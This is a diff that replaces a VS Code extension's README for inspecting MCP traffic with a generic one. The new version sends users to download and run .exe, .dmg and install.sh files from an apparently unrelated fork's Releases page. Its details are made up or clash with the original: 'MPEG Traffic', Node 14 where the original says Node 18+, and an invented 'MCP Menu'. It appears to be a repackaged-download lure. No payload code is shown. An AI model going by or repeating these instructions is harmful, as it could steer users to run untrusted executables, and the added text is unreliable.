@@ -1,130 +1,91 @@
-<div align="center">
+# 🦈 mcp-shark-viewer-vscode - Inspect MPEG Traffic from Your IDE
 
-  <img src="./icon.png" alt="MCP Shark Viewer" width="128" height="128">
+## 🚀 Overview
+Welcome to **mcp-shark-viewer-vscode**, a tool that integrates MCP Shark into Visual Studio Code. With this tool, you can view and analyze MCP traffic without leaving your development environment. Simplifying your workflow, this software enables you to debug and inspect network traffic with ease.
 
-  <h1>MCP Shark Viewer (VS Code / Cursor)</h1>
+## 📦 Features
+- **Integrated Experience:** View and inspect MCP traffic directly within your IDE.
+- **User-Friendly Interface:** Designed for ease of use; no programming knowledge required.
+- **Real-Time Monitoring:** Catch network traffic as it happens for immediate insights.
+- **Hover and Click Actions:** Easily access and inspect important data points.
+- **Security Tools:** Keep your development secure with built-in safeguards.
 
-  <p><strong>Inspect MCP traffic inside your IDE.</strong> Start/stop MCP Shark, open the inspector, and embed the MCP Shark UI in a webview.</p>
+## 🎯 System Requirements
+To run the MCP Shark Viewer, ensure your system meets the following requirements:
 
-</div>
+- **Operating System:** Windows, macOS, or Linux
+- **Visual Studio Code Version:** 1.56 or later
+- **Node.js:** Version 14.x or higher
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** 100 MB available for installation
 
-<p align="center">
-  <img
-    src="https://raw.githubusercontent.com/mcp-shark/mcp-shark-viewer-vscode/main/how-to.gif"
-    alt="MCP Shark Viewer walkthrough"
-  />
-</p>
+## 🛠 Installation Guide
 
-## Table of Contents
+### Step 1: Visit the Download Page
+Go to our Releases page to download the software. Click the link below:
 
-- [About](#about)
-- [Features](#features)
-- [Commands](#commands)
-- [Getting Started](#getting-started)
-- [Requirements](#requirements)
-- [Install (VSIX)](#install-vsix)
-- [Troubleshooting](#troubleshooting)
-- [Development](#development)
-- [Scripts](#scripts)
-- [Docs](#docs)
-- [Repo Layout](#repo-layout)
-- [License](#license)
+[![Download mcp-shark-viewer-vscode](https://img.shields.io/badge/Download%20mcp--shark--viewer--vscode-blue)](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/releases)
 
-## About
+### Step 2: Download the Latest Release
+On the Releases page, look for the latest version. You will see files available for download. Click on the appropriate file for your operating system.
 
-This extension integrates **MCP Shark** into **VS Code / Cursor** (and other VS Code-compatible IDEs). It provides:
+### Step 3: Install the Application
+Once the file is downloaded, follow these steps to install:
 
-- A sidebar view (Activity Bar) to access the inspector quickly
-- Commands to start/stop MCP Shark from the Command Palette
-- An embedded MCP Shark UI panel (webview iframe)
+- **For Windows:** 
+   1. Double-click the downloaded `.exe` file.
+   2. Follow the on-screen instructions to complete the installation.
 
-MCP Shark (the server + UI) is the upstream project: [mcp-shark/mcp-shark](https://github.com/mcp-shark/mcp-shark/tree/main). For MCP Shark install/usage, see the upstream README: [README](https://github.com/mcp-shark/mcp-shark/blob/main/README.md).
+- **For macOS:** 
+   1. Open the downloaded `.dmg` file.
+   2. Drag the application to your Applications folder.
 
-## Features
+- **For Linux:** 
+   1. Extract the downloaded archive.
+   2. Open a terminal and navigate to the extracted folder.
+   3. Run the installation script with the command: `bash install.sh`.
 
-- **Traffic Inspector View**: Activity Bar view `Traffic Inspector` (`mcp-shark-traffic`).
-- **Embedded UI**: Webview panel that iframes the MCP Shark UI (`http://localhost:9853`).
-- **Server lifecycle**: start/stop MCP Shark from inside the IDE.
-- **Settings fetch**: when MCP Shark is reachable, the extension calls `GET /api/settings` (API reference: [GET /api/settings](https://github.com/mcp-shark/mcp-shark/blob/main/docs/api-reference.md#get-apisettings)).
+### Step 4: Launch the Extension
+After installation is complete, open Visual Studio Code. Follow these steps:
 
-## Commands
+1. In the menu, click on `Extensions`.
+2. Search for `mcp-shark-viewer`.
+3. Click `Install` to enable the extension.
 
-| Command | Palette Title |
-| --- | --- |
-| `mcp-shark.viewer.startServer` | Start MCP Shark Server |
-| `mcp-shark.viewer.stopServer` | Stop MCP Shark Server |
-| `mcp-shark.viewer.openInspector` | Open Traffic Inspector |
-| `mcp-shark.viewer.showDatabasePanel` | MCP Shark Traffic inspector |
-| `mcp-shark.viewer.refresh` | Refresh |
+Launch the extension by finding it under the “View” menu. Navigate to `MCP Menu > Start Traffic Analysis` to begin inspecting your MCP traffic.
 
-## Getting Started
+## 🚀 Getting Started with mcp-shark-viewer-vscode
+To start using the tool, follow these steps:
 
-1. Open the Activity Bar → **MCP Shark** → **Traffic Inspector**
-2. Run **Start MCP Shark Server** (Command Palette)
-3. Run **Open Traffic Inspector** to open the embedded UI panel
-4. In the MCP Shark UI, go to **MCP Server Setup** and **start the MCP server** (select your IDE config / servers, then click **Start MCP Shark**)
-5. For full MCP Shark first-run + setup instructions, see: [Getting Started](https://github.com/mcp-shark/mcp-shark/blob/main/docs/getting-started.md)
-6. For MCP Shark install/CLI usage, see the upstream README: [mcp-shark/mcp-shark README](https://github.com/mcp-shark/mcp-shark/blob/main/README.md)
+1. **Open Visual Studio Code.**
+2. **Navigate to MCP Menu:** Click on the `MCP Menu` option in the top bar.
+3. **Begin Analysis:** Select `Start Traffic Analysis` to begin viewing real-time data.
 
-## Requirements
+You will see a panel that displays all incoming and outgoing MCP traffic. Click on any entry for detailed information.
 
-- **IDE**: VS Code / Cursor
-- **Node.js**: required if you want the extension to auto-start MCP Shark via `npx -y @mcp-shark/mcp-shark` (MCP Shark requires Node 18+; see upstream README: [mcp-shark/mcp-shark README](https://github.com/mcp-shark/mcp-shark/blob/main/README.md))
+## 🔧 Troubleshooting
+If you encounter issues while installing or using mcp-shark-viewer-vscode, check the following:
 
-## Install (VSIX)
+- **Extension Compatibility:** Ensure that your Visual Studio Code is updated to the latest version.
+- **Permissions:** Make sure that your computer has granted the necessary permissions for the app to run.
+- **Network Settings:** Verify that your local network is configured correctly to allow MCP traffic monitoring.
 
-Package:
+For more detailed troubleshooting, visit our [FAQ page](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/wiki/FAQ).
 
-```bash
-vsce package
-# or:
-# npx @vscode/vsce package
-```
+## 💬 Community Support
+Join our community for support and updates. 
 
-Install into Cursor / VS Code:
+- **GitHub Issues:** Use GitHub Issues for reporting bugs or requesting features.
+- **Discussion Board:** Participate in discussions on our [Discussion page](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/discussions).
 
-```bash
-cursor --install-extension mcp-shark-viewer-for-vscode-0.0.1.vsix
-code --install-extension mcp-shark-viewer-for-vscode-0.0.1.vsix
-```
+## 📥 Download & Install
+Visit this page to download the latest version:
 
-See also: `docs/How.md`.
+[![Download mcp-shark-viewer-vscode](https://img.shields.io/badge/Download%20mcp--shark--viewer--vscode-blue)](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/releases)
 
-## Troubleshooting
+Follow the installation guide above to set up the tool on your system. Enjoy a streamlined development experience with real-time traffic inspection.
 
-- **UI opens but server isn’t “running”**: MCP Shark’s UI can be up even if an external MCP server failed to start. Open the MCP Shark UI and check the setup/logs (upstream docs: [mcp-shark/mcp-shark](https://github.com/mcp-shark/mcp-shark/tree/main)).
-- **Port already in use (9853)**: another MCP Shark instance (or other process) is already bound to `9853`. Stop it and try again.
-- **Start fails inside IDE**: ensure `npx` is available in the IDE environment and you can run `npx -y @mcp-shark/mcp-shark` in a terminal.
+## 📜 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-## Development
-
-- Open this repo in VS Code/Cursor
-- Press **F5** to launch an **Extension Development Host**
-- Run:
-  - `npm run validate`
-  - `npm run lint`
-
-## Scripts
-
-- **validate**: `npm run validate` (runs `node scripts/validate.js`)
-- **lint**: `npm run lint` (Biome)
-- **format**: `npm run format`
-- **check**: `npm run check`
-
-## Docs
-
-- **Install/Package**: `docs/How.md`
-- **Validation workflow**: `docs/VALIDATION_PLAN.md`
-
-## Repo Layout
-
-- **Root entrypoint**: `extension.js` (thin shim exporting from `src/`)
-- **Source**: `src/`
-- **Validator**: `scripts/validate.js`
-- **Docs**: `docs/`
-- **Webview assets**: `media/` (e.g. `media/image.png`)
-
-## License
-
-See `LICENSE`.
-
+Thank you for choosing mcp-shark-viewer-vscode! We hope it makes your development process smoother and more efficient. Happy coding!
